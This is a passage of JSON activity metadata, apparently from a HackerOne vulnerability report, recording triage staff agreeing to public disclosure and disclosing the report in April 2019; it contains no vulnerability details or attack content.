eb29c5b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"reporter":{"username":"amassey","url":"/amassey"},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4578104,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-16T20:02:18.207Z","updated_at":"2019-04-16T20:02:18.207Z","first_to_agree":true,"actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4578125,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-16T20:05:48.343Z","updated_at":"2019-04-16T20:05:48.343Z","actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}